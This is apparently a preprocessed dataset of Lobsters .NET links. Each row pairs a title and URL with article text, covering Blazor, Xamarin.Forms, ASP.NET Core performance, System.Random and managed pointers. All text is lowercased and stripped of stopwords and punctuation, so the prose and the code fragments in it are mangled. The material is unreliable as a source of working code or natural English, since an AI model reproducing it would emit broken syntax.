invoked application complete without communicating userspace fuse daemon example read file whose page cache kernel page cache need forwarded fuse driver fusesharp also consists two component adaptordylib library wrap call libfuse library fusesharp dll communicates former set callback passed using pinvoke mechanism took aproach found libfuse library complicated poorly documented code documentation complexity code make difficult easily understand intention adaptor library written c implement key step setting communication channel fuse kernel processing loop simpler way handling net space fusesharp leverage modern net approach file handling threading memory management expose modern api designed specifically enable development userspace filesystems simple architecture implemented solely using net standard performance test compare fusesharp performance equivalent c native hf operation still untested apfs time measured second value average executing test case three time test executed clearing file cache using purge command spotlight filesystem indexing disabled automated backup disabled sequential writes sequential write request file request c c native hf concurrent writes n concurrent write request file request c c native hf big file writes write request file file size c native hf sequential read sequential read request file request c c native hf concurrent read n concurrent read request file request c c native hf big file read read request file file size c native hf license mit license copyright c códice sofware sl permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
190,Lobsters,dotnet,"C#, F#, .NET programming","Fixing Random, part 1",https://ericlippert.com/2019/01/31/fixing-random-part-1/,fixing random part,code granularity timer millisecond coming faic like,code say delicately really really dislike systemrandom like passion awful c design team try hard make language pit success natural way write program also correct elegant performant way systemrandom come along cringe every time see code stackoverflow us almost always wrong seldom easy see make right let start obvious problem natural way use also wrong way naive developer think need new random dice roll void random r new random int x rnext two line already world pain first every time called create new random implementation random available last couple decade default seed current time granularity timer millisecond computer run nanosecond scale likelihood get two randoms seed high therefore likely successive call produce run number never want make new random avoid want make one reuse bad idea stash away static thread safe fortunately learned attentive reader problem fixed version clr exactly sure version new random seed randomly rather based current time thanks bcl team fixing irksome problem better late never second argument next minimum value produced inclusive maximum value produced exclusive program produce random number drawn correct way get number course next got classic example steve maguire candy machine interface concept candy machine microsoft used item number say price say put quarter punch item number dammit wait item cost got backwards got weird gum instead jalapeno chip true story actually made mistake microsoft candy machine trivial problem really fundamental problem working low level abstraction anymore rand good enough sophisticated problem statistical modeling attendant probabilistic reasoning solve modern programming language need game writing code business domain probability mechanism domain call method return random number coming faic start simply improving existing implementation random humble beginning develop new class library make programming probability much readable powerful efficient c like like loading related
191,Lobsters,dotnet,"C#, F#, .NET programming",How many keywords I can fit into a single C# expression?,https://www.tabsoverspaces.com/233768-how-many-keywords-i-can-fit-into-a-single-csharp-expression,many keywords fit single c expression,many keywords fit single c expression related post,many keywords fit single c expression feb min c playing day ago yield return await got idea try fit much keywords possible one expression mean much blue word visual studio default color possible together separated semicolon comma colon bracket etc obviously yield return await give u together one also yield return yield return base yield return sizeof still waiting car yearly checkup hence mindlessly wasting time came class c async task test switch case null await false break public systemruntimecompilerservicestaskawaiter bool getawaiter default case null await false answer point ran time received message garage car ready maybe come even longer solution eager see related post jiří činčura independent developer focusing data business layer language construct parallelism database specifically entity framework asynchronous parallel programming cloud azure microsoft valuable professional read article guide tip trick wwwtabsoverspacescom
192,Lobsters,dotnet,"C#, F#, .NET programming",C# Futures: Lambda Attributes,https://www.infoq.com/news/2019/02/CSharp-Lambda-Attributes,c future lambda attribute,c lambda lambda attribute proposal,attribute key part net metadata processing capability used compiler static analyzer runtime library variety purpose normal functionsmethods attribute prior proposal lambda anonymous function could theory attribute applicable normal functionsmethods could applied lambda new attribute considered specifically new attribute control captured lambda capturenone variable captured lambda compiled static function capturethis pointer captured lambda compiled method captureany local variable captured lambda compiled part anonymous closure object working performance sensitive code captureany avoided new delegate matching closure object need created instance capturethis bad new delegate still must allocated delegate could result inefficient memory use keep outer object alive longer otherwise necessary finally capturenone would need create one instance delegate could reused throughout life application applied lambda attribute would used compiler analyzer ensure capturenone lambda accidentally changed le efficient type future essentially attribute would act form documentation concept new example c lambda one explicitly list variable lambda capture difference attribute would optional c unless otherwise enforced analyzer proposal attribute also added parameter lambda order avoid confusion parameter must enclosed parens using attribute attribute also inside paren applies parameter attribute outside parens apply lambda whole information see lambda attribute proposal github
193,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core: Saturating 10GbE at 7+ million request/s,https://www.ageofascent.com/2019/02/04/asp-net-core-saturating-10gbe-at-7-million-requests-per-second/,aspnet core saturating million request,million http request per second single server preview pre version preview aspnet core aspnet core current techempower benchmark continuous result throughput single server environment core ht gb ram compared server cluster process internet facing server internet facing webserver explained documentation data access performance postgres mysql performance important age ascent techempower motivation setting benchmark net core aspnet core net foundation c vbnet f book runtime matt open source net year later ready production bingcom us used webserver internet aspnet core preview net core preview net hardware intrinsics api dotnetcoreclr dotnetcoreclr dotnetcoreclr dotnetcoreclr dotnetcoreclr reduced allocation zero allocation aspnetaspnetcore dotnetcoreclr running minute connection test localhost result http request response allocation le allocated total processing million request generating response continuous performance monitoring benchmarkdotnet entire suite full system benchmark public performance dashboard aspnetbenchmarks result aspnet core already faster aspnet core raw throughput readytorun tiered compilation runtime performance dotnetperformance quickly spotted reported aspnet core fast getting even faster fast,million http request per second single server coming year since last posted performance aspnet core preview pre version preview aspnet core released time follow find evolved aspnet core current looking latest run techempower benchmark continuous result aspnet fastest webserver top spot able respond million http request per second recently saw another post different product throughput measured monthly use time period trillion http request per month also extraordinary amount bandwidth enough continuously saturate link result webserver load tester running inside docker container two different physical linux machine connected network throughput single server aspnet core fast linux window environment core ht gb ram compared server compare well known server comparison faster ngnix faster servlet faster servlet tomcat faster package faster nodejs running cluster process nodejs single threaded internet facing server aspnet kestrel webserver used benchmark edge server used internet facing webserver explained documentation need second webserver acting reverseproxy server front go full speed also work reverseproxies fit infrastructure data access performance often hear defeatist argument performance like matter database well time postgres test type database update exercise persistence object database performance running update statement similar spirit test exercise variable number readthenwrite style database operation http api request database query database update aspnet core occupies position entry raw middleware mvc respectively level run sql statement per second select update looking longer time period per second per minute per hour per day per month test type fortune full featured test closely mimicking wider range activity web application executes combination produce web page exercise orm database connectivity dynamicsize collection sorting serverside template x countermeasure character encoding aspnet core performs well also request served per second coming entry per second per minute per hour per day per month net run common language runtime language neutral also c vbnet position mysql net work many different database looking mysql test type multiple database query multiple row fetched dramatically punish database driver connection pool highest queriesperrequest tested test demonstrates convergence toward zero requestspersecond database activity increase aspnet come mysql entry performing query per second per second per minute per hour per day per month performance important illyriad game building new scale gaming age ascent ultrammo realtime twitch combat unprecedented scale high performance business level mean le directly affect bottom line choice performance framework important u word techempower motivation setting benchmark application performance directly mapped hosting dollar company large small hosting cost pain point weak performance also cause premature costly scale pain requiring earlier optimization effort increased architectural complexity finally slow application yield poor user experience may suffer penalty levied search engine building application one framework meant best hardware suitable one tenth much load would chosen different framework become important cloudbased hosting rather paying fixed cost server pay need usage per minute granularity net core aspnet core fully opensource framework net foundation commonly used c vbnet f language also open source designed github run opensource language aim goal clr make programming easy book runtime net core aspnet core born opensourcing net reimagining aspnet also took window crossplatform additionally supporting macos flavor linux bsd adding arm supported chipsets net community embraced opensourcing net progress never vibrant net renaissance begun graph matt open source net year later grounded original aim highly productive empower developer achieve along journey gained laser like focus performance server achieve ready production yes use net core aspnet core bingcom us aspnet webserver kestrel already used webserver internet even though first released le year ago jump warm aspnet core preview every version net core making huge improvement performance core library example introducing new type concept allow higher performance continuing improvement many change net core preview perhaps biggest u net hardware intrinsics api allows intel sse simd hardware instrinsics used directly managed code eg dotnetcoreclr dotnetcoreclr dotnetcoreclr dotnetcoreclr many aspect runtime moving c portion runtime c jit easily target exactly cpu running achieve higher performance eg dotnetcoreclr reduced allocation one big focus performance work framework reduce allocation le allocation le work garbage collector allocation performance async statemachine dramatically improved allocation aspnet core zero allocation fact combined merging two pull request pr aspnetaspnetcore dotnetcoreclr steady state allocation plaintext platform level entirely eliminated zero allocation zero allocation look like running minute connection test localhost result http request response allocation le allocated total processing million request generating response continuous performance monitoring mentioned earlier laser like focus really mean aspnet core repository microbenchmarks using great tool benchmarkdotnet verify isolation change affect performance however importantly entire suite full system benchmark scenario run linux window physical server cloud total full system performance test running continuously part continuous integration ci several time day catch regression early public performance dashboard fully open source open contributor full page performance kpis time series graph completely available public aspnetbenchmarks result looking page already saw aspnet core fast looking dashboard show aspnet core already faster aspnet core scenario also see preview tracked compared prior version current patch servicing release surprise impact patching public dashboard continuous display microsoft office raw throughput well throughput latency time cold start first response memory usage closely tracked time every scenario memory usage aspnet core greatly reduced cold start time first response improved net feature like readytorun aot tiered compilation combined give improved startup improved steadystate performance good serverless scenario like azure function aws lambda well first spin new container vm server scaling deployment update runtime performance performance also tracked aspnet core lower level stack net core runtime continuously monitored also window linux macos arm repository dotnetperformance contains benchmark used testing performance net framework regression quickly spotted reported addressed aspnet core fast getting even faster net aspnet always highly productive future aspnet core net core productive also fast fast
194,Lobsters,dotnet,"C#, F#, .NET programming","Creating a Reusable, JavaScript-Free Blazor Modal",https://www.telerik.com/blogs/creating-a-reusable-javascript-free-blazor-modal,creating reusable javascriptfree blazor modal,webassemblybased net runtime blazornet getting set net core sdk installed blazor language service creating blazor library modal service iservicecollection extension modal component razor view component logic component markup adding bit style testing setting test project creating test component running test app wrapping github related news,guide chris sainty help learn build reusable modal without using javascript blazor razor application modal common feature today web application find ui framework range simple confirmation box fullblown form post going walk building javascriptfree reusable modal blazorrazor component application make thing even interesting going build modal way pas component display instead plain text markup string anyone new blazor let give quick overview blazor spalike framework developed microsoft clientside model run via webassemblybased net runtime also serverside model razor component run standard net core runtime find blazornet getting set new blazor development need make sure latest version net core sdk installed also need install blazor language service well blazor template via dotnet cli dotnet new microsoftaspnetcoreblazortemplates creating blazor library want able use modal whatever project see fit best way achieve using blazor library project included cli template installed project type work similar way class library allows u share component asset image cs etc blazor application project type currently available using dotnet cli run following command create new directory well blazor library project mkdir blazormodal cd blazormodal dotnet new blazorlib new blazor library project open visual studio anything else let remove default item come template thing want keep stylescss project look like modal service first thing going build modalservice going glue join modal component component wish use root project add new class called modalservicecs following code using microsoftaspnetcoreblazor using microsoftaspnetcoreblazorcomponents using system namespace blazormodalservices public class modalservice public event action string renderfragment onshow public event action onclose public void show string title type contenttype contenttypebasetype typeof blazorcomponent throw new argumentexception contenttypefullname must blazor component var content new renderfragment x xopencomponent contenttype xclosecomponent onshow invoke title content public void close onclose invoke going class expose two method show close well couple event show method interesting one though checking type passed via contenttype argument blazor component creates new renderfragment using said type passed onshow event used event handler get bit go know renderfragment simple term renderfragment represents piece ui blazor us renderfragments output final html browser code passed type foo resulting html would look like foo foo many interesting us renderfragment especially dealing dynamic component generation topic another time let crack iservicecollection extension creating library always find good idea provide extension method handle registering service di container make sure everything get registered correct scope plus consumer add single line apps add new class root project called servicecollectionextensioncs following code using blazormodalservices using microsoftextensionsdependencyinjection namespace blazormodal public static class servicecollectionextensions public static iservicecollection addblazormodal iservicecollection service return servicesaddscoped modalservice modal component service place build modal component always like separate logic markup component achieved creating base class logic component inherit leaving component markup first add new razor view named modalcshtml add new class called modalcshtmlcs reason naming visual studio nest base class razor view follow convention keep solution window nice tidy also sure razor view select razor page razor page work let look base class logic first oh one thing need change name base class see code stuck base end call want model another popular choice stop name clash code generated modalcshtml component logic using blazormodalservices using microsoftaspnetcoreblazor using microsoftaspnetcoreblazorcomponents using system namespace blazormodal public class modalbase blazorcomponent idisposable inject modalservice modalservice get set protected bool isvisible get set protected string title get set protected renderfragment content get set protected override void oninit modalserviceonshow showmodal modalserviceonclose closemodal public void showmodal string title renderfragment content title title content content isvisible true statehaschanged public void closemodal isvisible false title content null statehaschanged public void dispose modalserviceonshow showmodal modalserviceonclose closemodal working top inject instance modal service declaring parameter using markup side component overriding one blazor lifecycle method oninit attach showmodal closemodal method respective onshow onclose event modal service showmodal closemodal method pretty selfexplanatory part probably worth pointing call statehaschanged need call statehaschanged due fact method invoked outside component method tell component something changed need rerender finally component implement idisposable interface unregister event handler component destroyed let look markup side component markup inherits modalbase div class bmcontainer isvisible bmactive stringempty div class bmoverlay onclick closemodal div div class blazormodal div class bmheader class bmtitle title button type button class bmclose onclick closemodal span time span button div div class bmcontent content div div div first line directive stating component inheriting modalbase next container div bit razor syntax us isvisible property toggle bmactive class responsible showing hiding component next div creating darkened overlay modal sit also onclick handler close modal user click anywhere overlay come modal header display title along button used close modal content marker renderfragment talked earlier displayed adding bit style component would complete without bit styling nothing special clever mean cs guru following class give everything nice clean look feel modal centered horizontally vertically page thanks wonder flexbox bmcontainer display none alignitems center justifycontent center position fixed width height zindex bmoverlay display block position fixed width height zindex backgroundcolor rgba bmactive display flex blazormodal display flex flexdirection column width backgroundcolor fff borderradius border solid fff padding zindex bmheader display flex alignitems flexstart justifycontent spacebetween padding bmtitle marginbottom bmclose padding margin auto backgroundcolor transparent border webkitappearance none cursor pointer testing built modal would good see action let add standalone blazor app solution try work well serverside project prefer rightclick solution add new project select aspnet core web application give name going call blazortest finally select blazor project type dialogue prefer could use cli following command dotnet new blazor n blazortest also need add project reference blazortest whatever called blazormodal project solution look like setting test project test project need three thing register modal use first need add following line viewimportscshtml using blazormodal using blazormodalservices addtaghelper blazormodal using statement save u use fully qualified name using modalservice addtaghelper import component specified namespace second need add modalservice di container due earlier work creating service collection extension method need add following configureservices method startupcs using blazormodal public void configureservices iservicecollection service servicesaddblazormodal third final task add modal component mainlayoutcshtml inherits blazorlayoutcomponent modal div class sidebar navmenu div code omitted brevity setup test project use modal component creating test component order test modal going create simple form component display modal page folder add new razor view called simpleformcshtml add following code showform div class simpleform div class formgroup label firstname first name label input bind firstname type text class formcontrol id firstname placeholder enter email div div class formgroup label lastname last name label input bind lastname type text class formcontrol id lastname placeholder enter email div button onclick submitform class btn btnprimary submit button div else div class alert alertsuccess role alert thanks firstname lastname submitting form div function bool showform get set true string firstname get set string lastname get set void submitform showform false component take user first last name show personalized message click submit left call let make addition index component call modal simple form created page inject modalservice modalservice hello world welcome new app surveyprompt title blazor working hr button onclick showmodal show modal button function private void showmodal modalserviceshow simple form typeof simpleform done finished index component look like running test app run test app gone plan work something like wrapping post built reusable modal without using javascript also built way display component think really nice feature fit nicely blazor component model code post available github related news looking news info blazor check recommended resource
195,Lobsters,dotnet,"C#, F#, .NET programming",Xamarin.Forms 3 For You and Me,https://www.telerik.com/blogs/xamarin-forms-3-for-you-and-me,xamarinforms,xamarinforms cascading style sheet doc flex layout pie chart telerik ui xamarin cs xaml check doc android bottom tab summing apply xamarinforms read,article dive exciting new feature xamarinforms release developer leverage xamarin apps developer genuinely excited software modern software run world developer get shape future developer often wait next hotness drop chosen platform tool developer known stay cutting edge eager try latest bit come obvious risk bricking computer wasting hour getting thing work hey new software cool however reality professional software often bring cautiousness developer get wary hot untested bit easily development environmentstools get messed amidst dilemma come new xamarinforms release still fairly new xamarinforms shown surprising maturity existing feature work long awaited new functionality brings joy developer xamarinforms release demonstrates stability thus lowering barrier developer adoption xamarinforms developer article take lap around new feature developer find rather useful integrate xamarin apps get play around latest greatest enjoying platform stability lose cascading style sheet way say ai nt dark magic cs found way beloved xamarinforms shut front door yeah initial reaction many net developer point cs styling xaml optional actually work beautifully developer used building web need learn anything new cs xamarinforms obeys rule cs parsing maturing preprocessors like lesssass may also used use cs xamarinforms developer simply create file cs extension start writing normal cs importantstuff fontsize fontstyle bold color individid margin label button backgroundcolor check cs specifying class individual element id entire type element setting property value done way regular old cs sold cs ca nt wait use good use individual cs file within xaml file xamarinforms contentpageresources stylesheet source path cs relative xaml page contentpageresources contentpagecontent label text important styleclass importantstuff contentpagecontent example show loading cs applying class label control cs xamarinforms stay building web mobile start sharing style find cs xamarinforms doc flex layout may sound suspicously like flexbox web good reason xamarinforms newest layout rendering flexlayout actually inspired flexbox layout cs idea behind flexlayouts give container layout many different flexible option layout child best fill available space may thinking awesome show best thing flexlayout making use sweet layout option simple adding control tweaking property layout attached property akin set control position grid gridrow control let take peek example combine cs flexlayout goodness let see action using beautiful pie chart come builtin telerik ui xamarin pro tip developer nt need reinvent wheel complex ui telerik ui really show engineering behind control performance flexible apis cs chart flexbasis height third flexbasis height half flexbasis height full flexbasis height xaml flexlayout direction row wrap wrap alignitems center aligncontent start telerikchart radpiechart styleclass chart telerikchart radpiechartpalette local orangepalette telerikchart radpiechartpalette telerikchart radpiechartbindingcontext local chartviewmodel telerikchart radpiechartbindingcontext telerikchart radpiechartseries telerikchart pieseries radiusfactor valuebinding value itemssource binding data telerikchart radpiechartseries telerikchart radpiechart telerikchart radpiechart styleclass chart telerikchart radpiechartpalette local brightpalette telerikchart radpiechartpalette telerikchart radpiechartbindingcontext local chartviewmodel telerikchart radpiechartbindingcontext telerikchart radpiechartseries telerikchart pieseries radiusfactor valuebinding value itemssource binding data telerikchart radpiechartseries telerikchart radpiechart telerikchart radpiechart styleclass chart half telerikchart radpiechartpalette local darkpalette telerikchart radpiechartpalette telerikchart radpiechartbindingcontext local chartviewmodel telerikchart radpiechartbindingcontext telerikchart radpiechartseries telerikchart pieseries radiusfactor valuebinding value itemssource binding data telerikchart radpiechartseries telerikchart radpiechart xaml markup cs combined produce layout like portrait orientation like landscape orientation flexlayout work resizing making sure everything enough room displayed matter orientation u nifty work container control matter containing child visual tree whole lot flexlayout check doc full story android bottom tab next xamarinforms feature labeled time android navigational tab generally top let face io taught u rightful place tab bottom screen xamarinforms way move tab bottom screen steve job would wanted designed android getting tab rendered bottom screen way easier anything else ever android var tabspage new xamarinformstabbedpage tabspageon xamarinformsplatformconfigurationandroid settoolbarplacement toolbarplacementbottom yeah xamarinforms making android development tolerable since something summing quick lap around new best feature xamarinforms styling xaml control page using cs stay sure seems bit weird considering use hard cs knowledge web world like selector cascading rule apply xamarinforms pretty much nobrainer start using optional feature developer choose xaml style cs flexlayoutis another nifty little rendering feature second worthy bit inspiration web world happily brought xamarinforms time add control flexlayout layout let layout calculation everything appear screen developer read flexible layout option android bottom tab mobile world developer definitely give xamarinforms spin stable provides exciting new feature staying cutting edge awesome benefit may inclined look forward xamarinforms onwards future
197,Lobsters,dotnet,"C#, F#, .NET programming",Managed pointers in .NET,http://tooslowexception.com/managed-pointers-in-net/,managed pointer net,book ref parameter ref local ref return read great blog post adam sitnik ref type internals managed pointer stackallocated object managed pointer heapallocated object thanks brick plug tree mechanism summary ref return pointer article vladimir sadov reference http mustoverridecommanagedrefsclr http mustoverridecomrefsnotptrs http adamsitnikcomrefreturnsandreflocals,disclaimer article consists fragment book adapted reedited considerably presented form independent whole post time regular net developer us object reference simple enough managed world constructed object referencing via object reference object reference fact typesafe pointer address always point object methodtable reference field often said point beginning object thus using may quite efficient object reference simply whole object address example gc quickly access header via constant offset address field also easily computable due information stored methodtable however another pointer type clr managed pointer could defined general type reference may point location beginning object say managed pointer point local variable whether reference heapallocated object simply stackallocated type parameter like field compound type meaning field type whether value reference type element array despite flexibility managed pointer still type managed pointer type point object regardless localization denoted cil somenamespacesomeclass type pointing custom somenamespacesomeclass instance strong typing make safer pure unmanaged pointer may cast back forth literally everything also managed pointer offer pointer arithmetic known raw pointer particularly make sense add subtract address represent pointing various place inside object local variable however flexibility come without cost reveals limitation possible place use managed pointer say managed pointer type allowed local variable parameter signature directly said used field signature element type array boxing value managed pointer type disallowed using managed pointer type return type method verifiable due limitation managed pointer directly exposed c language however long present wellknown form ref parameter passing parameter reference nothing else using managed pointer underneath thus managed pointer also often referred byref type byref simply note recently since c managed pointer usage widened form ref local ref return collectively referred ref variable thus last sentence ecma citation using managed pointer type return type relaxed ref parameter wellknown longlasting example ref variable ref parameter instead passing argument value whether struct value reference may pas reference especially useful case valuetypes structs avoid copying passing value public class someclass public int field public struct somestruct public int field public int main int data somestruct s new somestruct ssfield helper ref s return ssfield private void helper ref somestruct data datafield great optimization trick cause heap allocation using struct instead class also eliminate overhead possible data copying regardless struct size ref local see ref local local variable store managed pointer thus convenient way creating helper variable may later used direct access given field array element another local variable please note left right side assignment must marked ref keyword denote operating managed pointer public static void usingreflocal someclass data ref int reflocal ref datafield reflocal trivial example make illustrative sense gaining direct access int field performance gain neglectable commonly may want use ref local gain direct pointer heavyweight instance make sure copying happen pas reference somewhere use locally ref local also commonly used store result ref return method ref local may assigned reference null first glance may sound strange make perfect sense think ref local variable storing address reference mean reference point anything ref return ref return allows u return method variable type representing managed pointer obviously limitation must introduced using msdn say return value must lifetime extends beyond execution method word local variable method return instance static field class argument passed method attempting return local variable generates compiler error public static ref int returnbyrefvaluetypeinterior int index int localint return ref localint compilation error return local localint reference ref local however perfectly fine ref return element method parameter method perspective argument life longer method public static ref int getarrayelementbyref int array int index return ref array index concludes short summary ref variable usage c want dig usage performance impact read great blog post adam sitnik note passingby reference important term optimizing common code base different library constantly gain attention creator net c language c possibility pas readonly reference using keyword instead ref use readonly ref explicitly say reference used accessing data without possibility modify look possibility one next blog post ref type internals interesting question may arise regarding byref type example passing around managed pointer cooperate gc code generated underneath jit compiler let dig deeper main use case managed pointer usage may grouped understanding reveal reason behind mentioned limitation well help u understand better managed pointer stackallocated object managed pointer point method local variable parameter implementation point view local variable parameter may stackallocated enregistered cpu register jit compiler decides managed pointer work case simply put perfectly fine managed pointer point stack address one reason managed pointer may object field may boxed appears way managed heap could outlive method within indicated stack address located would dangerous pointed stack address would contain undefined data probably method stack frame limiting managed pointer usage local variable parameter lifetime limited restrictive lifetime possible target point data stack enregistered local variable parameter remember enregistered target optimization detail provide least lifetime characteristic stackallocated target lot depends jit compiler target enregistered even better register may simply used managed pointer word using cpu register instead stack address change much jit compiler perspective managed pointer precisely object pointed reported gc must otherwise gc may detect reachability target object happens managed pointer root moment let analyze simple passing reference scenario remove effect inlining make thing clearer noinlining attribute used prevents inlining test method static void main string args someclass someclass new someclass passingbyreftest ref someclass consolewriteline someclassfield print public class passingbyref methodimpl methodimploptionsnoinlining public static void test ref someclass data datafield least line corresponding someclass instance must live garbage collected interesting u moment see code represented cil assembly level jitting corresponding cil code reveals usage strongly typed someclass managed pointer main method ldloca instruction used load address local variable specific index index corresponds someclass variable onto evaluation stack passed test method test method us ldindref instruction dereference address push resulting object reference evaluation stack method private hidebysig staticvoid main string args cil managed local init class someclass newobj instance void someclass ctor ldlocas call void passingbyref test class someclass ret method public hidebysig staticvoid test class someclass data cil managed noinlining stfld someclass ret cil code may interesting usually jitted code reveals true nature happens underneath looking assembly code method indeed see test method receives address pointing stack reference newly created someclass instance stored programmain systemstring sub rsp growing stack xor eax eax zeroing eax mov rax zeroing stack address local variable stored mov rcx moving mt someclass rcx call calling allocator result rax contain address new object mov rax storing address new object onto lea rcx moving local variable stack address rcx register first test method argument call passingbyreftest someclass byref add rsp ret passingbyreftest someclass byref mov rax rcx dereferencing address rcx rax result rax contains object instance address mov dword storing value proper field ret pure assembly code point view sa imilar code would generated example using pointer pointer c test method executing gc know rcx register contains object address answer interesting u test method contains empty gcinfo word test method simple gc interrupt work thus need report anything simple test method complex could jitted fully partially interruptible method explained detail book chapter example latter case could see various safepoints listing cpu register stack address live slot u gcinfo jit generated codecoreclrunsafepassingbyreftest coreclrunsafesomeclass byref begin size rdipush rsisub rsi rcx call rsi interior call rsi interior add rsipop rdiret live slot would listed socalled interior pointer managed pointer general may point inside object explained soon thus managed pointer always reported interior root besides case point fact beginning object interpretation pointer gc side explained later similar code would generated case using struct instead class interesting even theoretically known case test method operates stackallocated data local variable somestruct value type corresponding gcinfo still list live slot using managed pointer gc ignore managed pointer heapallocated object stackpointing managed pointer may seem interesting pointing object managed heap even interesting contrast object reference managed pointer point inside object field type element array already cited ecma standard say fact interior pointer named literature think little may seem interesting interior pointer pointing inside managed object may reported gc let modify little code pas reference field heapallocated someclass instance static void main string args someclass someclass new someclass passingbyreftest ref someclassfield consolewriteline someclassfield print public class passingbyref methodimpl methodimploptionsnoinlining public static void test ref int data data keep containing object life main method look straightforward instantiates someclass object pass reference one field test method print result modified test method expects managed pointer execution test method operates managed pointer int regular pointer int field heapallocated object gc know may collect corresponding object used managed pointer belongs absolutely nothing said int pointer come first please note test method contrived example jitted atomic gc point view method gc simply interrupt passingbyreftest byref mov dword rcx ret question proper root reporting needed simple method let suppose test method complex enough produce interruptible code example corresponding jitted code could look rsi register keep value integer field address passed argument rcx register reported interior pointer u gcinfo jit generated codecoreclrunsafepassingbyreftest byref begin size rdipush rsisub rsi rsi interior rsi interior add rsipop rdiret gc happens test method suspended rsi contains interior pointer gc must interpret find corresponding object general trivial one could think simple algorithm start pointer address try find beginning object scanning memory left byte byte must done single byte shift guaranteed way aligned interior pointer respect object beginning obviously efficient many drawback interior pointer may point distant field big object distant element large array lot naïve scan performed trivial detect beginning object could check subsequent byte case form valid mt address increase algorithm complexity one could imagine marker byte allocated beginning object add unnecessary memory overhead support theoretically rare interior pointer usage would really hard define mark byte unique enough identify object beginning unambiguously managed pointer reported interior pointer may point stack make sense find containing object first place may point example inside stackallocated struct hope get point algorithm impractical intelligent support required resolve interior pointer efficiently fact gc relocation phase object compacted interior pointer translated corresponding object thanks brick plug tree mechanism crucial whole gc process also useful context interior pointer given specified address proper brick table entry calculated corresponding plug tree traversed find plug continuous region live object within address life brick table consists brick entry representing region managed heap brick entry contains offset root plug info within region root plug info plug info related plug constitute binary tree easily searchable representation plug within region plug scanned object object find one contains considered address plug scanning possible plug start object following object easily found object size known obviously algorithm cost also plug tree traversal plug scanning take time dereferencing interior pointer trivial second important reason managed pointer allowed live heap especially object field creating complex graph object referenced interior pointer would make traversing graph quite costly giving flexibility simply worth quite significant overhead introduces note even mark phase plug tree yet exist interpreting interior pointer mark corresponding object even costly whole corresponding brick must scanned find object corresponding given interior pointer please also note implementation dereferencing interior pointer know object within life possible gc plan phase plug gap constructed altogether corresponding plug tree obviously creates overhead gc mark phase dereferencing necessary normal program execution interior pointer pointer one read write memory pointed summary interior pointer interpretation allows magic thing happen dangerous first glance example able return managed pointer locally created class instance array public static ref int returnbyrefreferencetypeinterior int index int localarray new return ref localarray index may seem counterintuitive one could return method reference single integer array element array object seems become unreachable obviously method end returned interior pointer becomes root array array still alive interior pointer however lost array object reference due limitation mentioned previously brick plug tree availability pointer runtime converted back proper reference object point summary remark please remember ref variable ref parameter ref local ref return usage small wrapper around managed pointer treated pointer obviously variable read great ref return pointer article vladimir sadov feel like needing clarification next article performance implication ref variable ref returning collection readonly ref discussed p fun generic interior pointer generator public class helper public static ref makeinterior obj ref new obj reference http mustoverridecommanagedrefsclr http mustoverridecomrefsnotptrs http adamsitnikcomrefreturnsandreflocals
199,Lobsters,dotnet,"C#, F#, .NET programming",Introducing the Telerik UI for Blazor Early Preview,https://www.telerik.com/blogs/introducing-the-telerik-ui-for-blazor-early-preview,introducing telerik ui blazor early preview,telerik ui blazor full release blazor razor component blazor server blazor recommended reading built groundup native net experimenting u telerik ui blazor early preview blazor mono webassembly runtime mono webassembly runtime razor component razor component blazor server blazor recommended reading blazor beginner guide quick start guide productivity download blazor beginner guide tldr blazor razor blazor run client using webassembly blazor server running server via signalr razor component instead javascript ship aspnet core may generally available built groundup native net experimenting u telerik ui blazor early preview data grid tab set button day free trial try telerik ui blazor full release installing telerik ui blazor telerikcom default default bootstrap material blazor data grid summary telerik ui blazor available download today try latest telerik ui blazor,introducing telerik ui blazor net ui component blazor framework without legacy javascript dependency progress software telerik brand long history supporting net community product like telerik ui aspnet ajax ui aspnet ui aspnet core proud announce early preview release telerik ui blazor update telerik ui blazor full release article updated april supplement initial announcement back january blazor razor component blazor server blazor recommended reading built groundup native net experimenting u telerik ui blazor early preview blazor blazor new framework microsoft aspnet team introduces next generation component model allows developer write single page application spa without javascript blazor sound new development since initially experimental project blazor framework target mono webassembly runtime net runtime compiled wasm thus allowing net run client browser inspiring name blazor browser razor configuration application resource including dll file delivered client executed mono webassembly runtime razor component razor component blazor component widely used interchangeably correct terminology razor component razor component model refreshingly simple design component contain markup html logic c single razor cshtml file component capable handling data binding event dependency injection without javascript counter component demonstrates basic composition razor component counter component us basic html button increment counter field displayed within paragraph tag blazor operates single page application interaction component happen client update browser document object model dom handled blazor framework though data binding blazor server microsoft support framework running serverside mode called blazor server model offer backwards compatibility aspnet core mvc razor page specialized html helper tag helper option telerik team excited future aspnet development much like blazor running webassembly blazor server allows developer write single page application spa without javascript key difference blazor wasm blazor server way application deployed instead blazor running via webassembly client blazor framework run server executable mode aspnet core host application provides communication channel using signalr technology using signalr application sends ui update receives change event binary packet data web socket connection since change sent connection payload small efficient since blazor server utilizes blazor framework component used deployment type blazor recommended reading new likely catch thing blazor free ebook blazor beginner guide quick start guide productivity bring speed biting nail check included tldr well download blazor beginner guide tldr blazor net spa framework generally associated net running web assembly however blazor capable running multiple scenario including serverside using blazor server razor popular template markup syntax net browser razor blazor net based web framework run client using webassembly blazor server blazor framework running server via signalr razor component component model blazor webassembly blazor server blazor hosting model client serverside utilize c apis instead javascript blazor webassembly wasm expected ship aspnet core may blazor server already generally available supported since aspnet built groundup native net telerik ui blazor wrap existing jqueryjavascript product c pretend something new telerik ui blazor started scratch write component net whenever possible alternatively could decided wrap existing jquery component shortterm path however feel wrapper programming model leaky abstraction would bleed back net api layer addition feel native net approach long term investment fetch larger gain long run consider modern day tortoise v hare story express enough important javascript net ecosystem u ui library developer skill type however segment net community expressed need frontend web tooling require javascript happy opportunity serve community blazor experimenting u blazor exciting prospect net developer allows u create fullstack net web application received countless feedback item requesting support next generation platform initially offered telerik ui blazor early preview release development model closely resembled effort made microsoft blazor release cycle small set functionality gained feedback knowledge customer use product experimental phase telerik ui blazor developer shared u use case experience roadblock bug telerik ui blazor early preview initial offering included popular ui component including data grid tab set button customer feedback expanded number component rage apis believe building customer need recommendation path success preview phase ready try telerik ui blazor day free trial try telerik ui blazor full release installing telerik ui blazor installing telerik ui blazor requires simple step first need free trial telerikcom creating account browser automatically download product installer installer add system telerik ui blazor nuget package source binary visual studio integration demo installer complete choose manually upgrade existing project start 